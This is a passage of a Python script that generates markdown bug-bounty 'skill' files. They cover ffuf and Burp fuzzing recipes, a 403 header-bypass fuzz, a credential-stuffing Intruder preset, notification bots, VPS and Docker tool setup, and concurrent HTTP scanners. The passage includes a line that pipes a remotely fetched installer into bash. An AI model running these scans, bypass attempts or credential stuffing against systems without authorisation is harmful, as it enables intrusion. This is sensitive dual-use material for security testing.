        Host: {{Hostname}}
        ...
    extractors:
      - type: regex
        name: token
        regex: ['token=([a-zA-Z0-9]+)']
        internal: true
  - raw:
      - |
        GET /admin HTTP/1.1
        Host: {{Hostname}}
        Cookie: session={{token}}
```

## REFERENCES
nuclei-templates GitHub, ProjectDiscovery docs
""",

"ffuf_automation.md": r"""# SKILL: ffuf Automation
## Version: 1.0 | Domain: automation

---

## RECIPE — content discovery wrapper
```bash
#!/usr/bin/env bash
TARGET=$1
WL=${2:-~/wordlists/raft-large-directories.txt}
ffuf -u "https://${TARGET}/FUZZ" \
  -w "$WL" \
  -mc all -fc 404 -ac \
  -e .json,.xml,.bak,.old,.zip,.git,.env,.yml,.yaml,.txt,.log,.sql \
  -recursion -recursion-depth 2 \
  -t 50 -timeout 7 -p 0.05 \
  -of json -o "${TARGET//\//_}.json"
```

## RECIPE — parameter discovery
```bash
ffuf -u "https://target/api?FUZZ=test" -w ~/wordlists/burp-parameter-names.txt -mc 200 -fs 0 -ac
```

## RECIPE — Vhost discovery
```bash
ffuf -u "https://${IP}/" -H "Host: FUZZ.${TARGET}" -w ~/wordlists/subdomains-top1million-110000.txt -mc 200,301,302 -fs 0 -ac
```

## RECIPE — header bypass
```bash
ffuf -u "https://target/admin" -H "FUZZ: 127.0.0.1" -w ~/wordlists/headers.txt -mc 200,302 -fc 403,404 -ac
```

## REFERENCES
ffuf docs, OneListForAll, assetnote wordlists
""",

"burp_suite_automation.md": r"""# SKILL: Burp Suite Automation
## Version: 1.0 | Domain: automation

---

## ESSENTIAL EXTENSIONS
- Autorize (authz testing)
- Param Miner (hidden params + cache poisoning)
- HTTP Request Smuggler (PortSwigger)
- Active Scan++
- Backslash Powered Scanner
- Turbo Intruder (race conditions, fast brute)
- JSON Web Tokens (jwt manipulation)
- AuthMatrix
- DOM Invader (built-in)
- Hackvertor (encoding chains)
- BurpJSLinkFinder
- JS Miner
- BApp Param Auth Test
- Burp Bounty (custom rules)
- Software Vulnerability Scanner
- 403 Bypasser
- Logger++

## BURP REST API (PRO)
```bash
# Burp listens on http://127.0.0.1:1337 (config in User options → Misc)
# Trigger active scan
curl -X POST 'http://127.0.0.1:1337/v0.1/scan' -d '{"urls":["https://target.com"]}' -H 'Content-Type: application/json'
```

## SESSION HANDLING RULES
- Auto-relogin macros for long-running scans
- CSRF token refresh
- Header injection (e.g., custom auth)

## INTRUDER PRESETS
- Cluster bomb for credential stuffing
- Sniper for single-param fuzz
- Pitchfork for paired wordlists

## TURBO INTRUDER TEMPLATES
- race-single-packet-attack
- examples/many-requests
- ssrf-mass-test

## REFERENCES
PortSwigger Burp docs, BApp store
""",

}

# Add notify file separately because of dict syntax
automation_files["notification_telegram_discord.md"] = r"""# SKILL: Telegram / Discord Notifications
## Version: 1.0 | Domain: automation

---

## TELEGRAM BOT SETUP
1. Talk to `@BotFather` → `/newbot` → get TOKEN.
2. Get chat_id: send any message to bot, then `curl https://api.telegram.org/bot<TOKEN>/getUpdates`.

## SCRIPT (Python)
```python
import os, requests, sys
def tg(text, files=None):
    TOKEN=os.environ['TG_BOT_TOKEN']; CHAT=os.environ['TG_CHAT_ID']
    if files:
        for f in files:
            requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument',
                          data={'chat_id':CHAT,'caption':text[:1024]},
                          files={'document':open(f,'rb')})
    else:
        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage',
                      data={'chat_id':CHAT,'text':text[:4000],'parse_mode':'Markdown'})

if __name__ == '__main__':
    tg(sys.stdin.read(), sys.argv[1:])
```

## DISCORD WEBHOOK
1. Server settings → Integrations → Webhooks → New → copy URL.

## SCRIPT
```python
import os, requests, sys
WH = os.environ['DISCORD_WH']
def discord(text, file=None):
    if file:
        requests.post(WH, data={'content': text[:1900]}, files={'file': open(file,'rb')})
    else:
        requests.post(WH, json={'content': text[:1900]})
discord(sys.stdin.read(), sys.argv[1] if len(sys.argv)>1 else None)
```

## SLACK INCOMING WEBHOOK
```bash
curl -X POST -H 'Content-type: application/json' \
  --data '{"text":"new finding"}' $SLACK_WH
```

## REFERENCES
Telegram Bot API, Discord webhook docs
"""

automation_files["vps_setup_hunting.md"] = r"""# SKILL: VPS Setup for Bug Hunting
## Version: 1.0 | Domain: automation

---

## RECOMMENDED SPECS
- 2 vCPU, 4-8GB RAM, 60GB SSD (for moderate scope)
- Ubuntu 22.04 LTS
- DigitalOcean / Linode / Hetzner / Vultr ($5-20/month)

## INSTALL SCRIPT
```bash
#!/usr/bin/env bash
set -e
sudo apt update && sudo apt install -y \
  build-essential git curl wget jq python3 python3-pip golang nodejs npm \
  unzip tmux htop ripgrep fzf nmap masscan dnsutils whois \
  libpcap-dev libldns-dev

# Go tools
GO111MODULE=on go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest
go install -v github.com/projectdiscovery/notify/cmd/notify@latest
go install -v github.com/projectdiscovery/alterx/cmd/alterx@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/tomnomnom/waybackurls@latest
go install -v github.com/tomnomnom/assetfinder@latest
go install -v github.com/tomnomnom/qsreplace@latest
go install -v github.com/tomnomnom/unfurl@latest
go install -v github.com/d3mondev/puredns/v2@latest
go install -v github.com/owasp-amass/amass/v4/...@master
go install -v github.com/hahwul/dalfox/v2@latest
go install -v github.com/ffuf/ffuf/v2@latest
go install -v github.com/OJ/gobuster/v3@latest
go install -v github.com/sensepost/gowitness@latest

# Python tools
pip3 install --user trufflehog3 sqlmap arjun apkleaks dirsearch

# Misc
sudo wget https://github.com/danielmiessler/SecLists/archive/master.tar.gz -O /tmp/seclists.tar.gz
mkdir -p ~/wordlists && tar -xzf /tmp/seclists.tar.gz -C ~/wordlists/

# Nuclei templates
nuclei -ut

# Resolvers
wget https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -O ~/.config/resolvers.txt
```

## PERSISTENCE
- All output to /home/hunter/results/$DATE/
- Daily backup to S3 / object storage
- Pin tools to specific versions in /opt/tools/

## SECURITY
- SSH key only, disable password auth
- ufw allow OpenSSH; deny all else
- fail2ban
- unattended-upgrades for kernel

## REFERENCES
projectdiscovery.io, Tomnomnom tools
"""

automation_files["docker_hunting_environment.md"] = r"""# SKILL: Docker Hunting Environment
## Version: 1.0 | Domain: automation

---

## ALL-IN-ONE DOCKERFILE
```dockerfile
FROM ubuntu:22.04
RUN apt update && apt install -y \
    git curl wget jq python3 python3-pip golang nodejs npm unzip ripgrep nmap masscan
ENV GOPATH=/root/go PATH=/root/go/bin:$PATH
RUN go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest && \
    go install github.com/projectdiscovery/httpx/cmd/httpx@latest && \
    go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && \
    go install github.com/projectdiscovery/katana/cmd/katana@latest && \
    go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest && \
    go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest && \
    go install github.com/lc/gau/v2/cmd/gau@latest && \
    go install github.com/hahwul/dalfox/v2@latest && \
    go install github.com/ffuf/ffuf/v2@latest
RUN pip3 install sqlmap arjun trufflehog3 apkleaks dirsearch
RUN mkdir -p /root/wordlists && \
    git clone --depth 1 https://github.com/danielmiessler/SecLists /root/wordlists/SecLists
ENTRYPOINT ["/bin/bash"]
```

```bash
docker build -t hunter .
docker run -it --rm -v $PWD:/work -w /work hunter
```

## DOCKER-COMPOSE
```yaml
services:
  hunter:
    build: .
    volumes:
      - .:/work
      - ~/wordlists:/root/wordlists
    networks: [bbnet]
  burp:
    image: portswigger/burp-pro
    networks: [bbnet]
networks:
  bbnet:
```

## REFERENCES
projectdiscovery/pdtm
"""

automation_files["workflow_orchestration.md"] = r"""# SKILL: Workflow Orchestration
## Version: 1.0 | Domain: automation

---

## TOOLS BY COMPLEXITY
| Tool | Complexity | Use case |
|------|-----------|----------|
| bash + cron | Low | Solo, ≤10 targets |
| systemd timers | Low | Solo, better restart |
| make | Low | Ad-hoc pipelines |
| axiom | Med | Distributed across cheap VPSes |
| Prefect / Dagster | Med | Python-native DAGs |
| Apache Airflow | High | Team / large infra |
| Temporal / Argo | High | Cloud-native, k8s |

## AXIOM SETUP
```bash
# Install
bash <(curl -s https://raw.githubusercontent.com/pry0cc/axiom/master/interact/axiom-configure)
# Spin fleet
axiom-fleet hunt -i 10
# Run distributed
axiom-scan all_subs.txt -m httpx -p 80,443,8080,8443 -o probed.txt
axiom-scan probed.txt -m nuclei -t ~/nuclei-templates/ -severity high,critical
# Tear down
axiom-rm '*' -f
```

## DAG EXAMPLE (Prefect)
```python
from prefect import flow, task

@task
def subfinder(domain):
    return run(f"subfinder -d {domain} -all -silent")

@task
def probe(subs):
    return run(f"echo '{subs}' | httpx -silent")

@task
def nuclei_scan(alive):
    return run(f"echo '{alive}' | nuclei -severity high,critical")

@flow
def recon(domain):
    subs = subfinder(domain)
    alive = probe(subs)
    findings = nuclei_scan(alive)
    return findings

if __name__ == '__main__':
    recon.serve(name="recon")
```

## REFERENCES
axiom docs, Prefect docs, Apache Airflow
"""

automation_files["custom_tool_development.md"] = r"""# SKILL: Custom Tool Development
## Version: 1.0 | Domain: automation

---

## WHEN TO BUILD CUSTOM
- Existing tool can't handle your specific edge case
- You need finer control over output for downstream pipeline
- Speed matters and existing tool is bottleneck
- Your target has specific quirks (custom protocols, weird auth)

## GO TEMPLATE (concurrent HTTP scanner)
```go
package main
import ( "fmt"; "net/http"; "bufio"; "os"; "sync"; "time"; "crypto/tls" )

func main() {
    sem := make(chan struct{}, 50)
    var wg sync.WaitGroup
    s := bufio.NewScanner(os.Stdin)
    client := &http.Client{Timeout: 7*time.Second, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
    for s.Scan() {
        url := s.Text()
        sem <- struct{}{}; wg.Add(1)
        go func(u string) {
            defer wg.Done(); defer func(){<-sem}()
            r, err := client.Get(u)
            if err != nil { return }
            defer r.Body.Close()
            if r.StatusCode == 200 { fmt.Println(u) }
        }(url)
    }
    wg.Wait()
}
```

## PYTHON TEMPLATE (async)
```python
import asyncio, httpx, sys

async def probe(client, url):
    try:
        r = await client.get(url, timeout=7)
        if r.status_code == 200: print(url, flush=True)
    except: pass

async def main():
    sem = asyncio.Semaphore(50)
    async with httpx.AsyncClient(verify=False) as c:
        async def w(u):
            async with sem: await probe(c, u)
        urls = sys.stdin.read().split()
        await asyncio.gather(*(w(u) for u in urls))

asyncio.run(main())
```

## TIPS
- I/O-bound: use async (Go goroutines, Python asyncio, Node)
- CPU-bound: use Rust / Go
- Quick scripts: bash + xargs -P
- Pipe-friendly: stdin/stdout, no auth files
- Unix philosophy: do one thing well

## REFERENCES
Tomnomnom's tools (assetfinder, gf, qsreplace, anew) — exemplar of small composable tools
"""

for fname, content in automation_files.items():
    if fname == "notification_telegram_discord.md":
        continue  # added separately
    w("AUTOMATION", fname, content)
w("AUTOMATION", "notification_telegram_discord.md", automation_files["notification_telegram_discord.md"])

print("=== Done with SCR + AUTOMATION ===")
